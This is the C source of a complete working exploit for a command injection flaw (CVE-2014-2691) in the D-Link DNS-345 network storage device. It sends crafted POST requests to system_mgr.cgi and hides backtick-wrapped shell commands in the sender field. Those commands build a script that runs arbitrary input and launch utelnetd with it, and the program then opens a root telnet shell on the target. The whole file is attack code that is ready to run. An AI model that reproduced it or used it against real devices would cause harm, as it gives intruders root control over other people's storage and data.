#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#define BUFF_SIZE 2048

//Function declarations
int inputCheck(int, int);
int create_sock(void);
void target_check(int, int);
void usage(char *);
void banner_print(void);


int main(int argc, char *argv[]){

    if (!inputCheck(argc, 2)){
        usage(argv[0]);
    }
    //declare sockadd_in variable and pointer
    struct sockaddr_in sock, *sock_struct_ptr;
    sock_struct_ptr = &sock;

    int port = htons(atoi(argv[2]));//Converts unsigned short int to network byte order (big endian).
    int sfd, data, host;
    char data_buffer[BUFF_SIZE];
    //Web page for web requests
    char *pages = "cgi-bin/system_mgr.cgi";
    //HTTP POST data for web requests
    char *pdata = "cmd=cgi_email_test&login_method=0&f_username=&f_password=&f_port=25&"
                  "f_smtp=192.168.1.1&f_sender=`%s`&f_receiver=receiver%40receiver.com"
                  "&f_smtp_auth=0";
    char *telnet = "telnet %s";
    char shell[strlen(telnet)+ strlen(argv[1])];
    //Array of commands
    char *cmds[] = {"echo \\#\\!/bin/sh > G42.sh",
                    "echo \"while read cmd; do sh -c \\\"\\$cmd\\\";done;\" >> G42.sh",
                    "chmod 777 G42.sh", "utelnetd -l G42.sh"};

    char *req = "POST /%s HTTP/1.1\r\n"
                "Host: %s:%s\r\n"
                "User-Agent: infosec42\r\n"
                "Accept: */*\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "DNT: 1\r\n"
                //"Cookie: username=admin\r\n"
                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
                "Content-Length: %d\r\n"
                "Connection: keep-alive\r\n"
                "Pragma: no-cache\r\n\r\n"
                "%s";

    //assigning socket struct member values
    sock.sin_family = AF_INET;
    sock.sin_port = port;
    host = inet_aton(argv[1], &sock_struct_ptr->sin_addr);//setting sock.sin_addr.s_addr

    banner_print();
    target_check(port, host);//Checking destination target/port

    int i;
    for (i = 0; i < (sizeof(cmds) / sizeof(cmds[0])); i++){
        sfd = create_sock();//Creating socket
        if (connect(sfd, (struct sockaddr *) sock_struct_ptr, sizeof(sock)) < 0){
            perror("\n[!!!] ERROR connecting to target host [!!!]");
            exit(0);
        }

        char web_req[(strlen(req) + strlen(argv[1]) + strlen(argv[2]) + strlen(cmds[i]) + strlen(pages) +
                      strlen(pdata))];
        memset(web_req, 0, sizeof(web_req));
        snprintf(web_req, (sizeof(web_req)-1), req, pages, argv[1], argv[2], (147 + strlen(cmds[i])), pdata);
        char sploit[(strlen(web_req) + strlen(cmds[1]))];
        memset(sploit, 0, sizeof(sploit));
        snprintf(sploit, (sizeof(sploit)-1), web_req, cmds[i]);
        printf("\n[*] Sending HTTP POST request %d.\n", (i + 1));
        send(sfd, sploit, strlen(sploit), 0);//Send exploit
        
        if (i < 4){    
            //Receive data
            if ((data = recv(sfd, data_buffer, (sizeof(data_buffer)-1), 0)) < 0){
                perror("\n[!!!] ERROR receiving data [!!!]");
                exit(0);
            }
            else{
                printf("[*] Received %d bytes of data.\n", data);
            }
        }
        close(sfd);
        sleep(2);
    }
    
    printf("\n[--] EXPLOIT COMPLETED [--]\n\n[!!!] Connecting to ro0t shell [!!!]\n\n");
    memset(shell, 0, sizeof(shell));
    snprintf(shell, (sizeof(shell)-1), telnet, argv[1]);

    if (system(shell) < 0)
        perror("[!!!] ERROR connecting to ro0t shell");

    return 0;
}

//Function definitions
void usage(char *prog){

   printf("\n\t-- D-LINK DNS-345 Command Injection --\nProgram Usage: %s <IP Address> <Port>\n"
          "Program Example: %s 10.10.10.10 80\n\n", prog, prog);
   exit(0);
}


int inputCheck(int argc, int num){

    if (argc < num + 1){
        return 0;
    }
    else{
        return 1;
    }
}


void target_check(int port, int ip_address){

    if (ip_address == 0){
        printf("\n[!!!] ERROR: Please enter a valid IPv4 address [!!!]\n\n");
        exit(0);
    }
    else{
        printf("\n[*] Destination target was successfully set.\n");
    }

    if (port <= 0 || port > 65535){
        printf("\n[!!!] ERROR: Destination port must in the range of 1-65535 [!!!]\n\n");
        exit(0);
    }
    else{
        printf("[*] Destination port was successfully set.\n");
    }
}


int create_sock(void){

    int fd;
    
    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("\n[!!!] ERROR creating socket [!!!]");
        exit(0);
    }

    return fd;
}


void banner_print(void){

    printf(
            "________________________________________________   \n"
            "< D-LINK DNS-345 Command Injection Exploit >\n"
            "< Discovered/Exploited By: Jacob Holcomb/Gimppy >  \n"
            "< http://infosec42.blogspot.com >\n"
            "< http://securityevaluators.com >\n"
            "< CVE: CVE-2014-2691 >\n"
            "------------------------------------------------   \n"
            "                \\   ^__^                          \n"
            "                 \\  (xx)\\_______                 \n"
            "                    (__)\\       )\\/\\            \n"
            "                     U  ||----w |                  \n"
            "                        ||     ||                  \n");

}

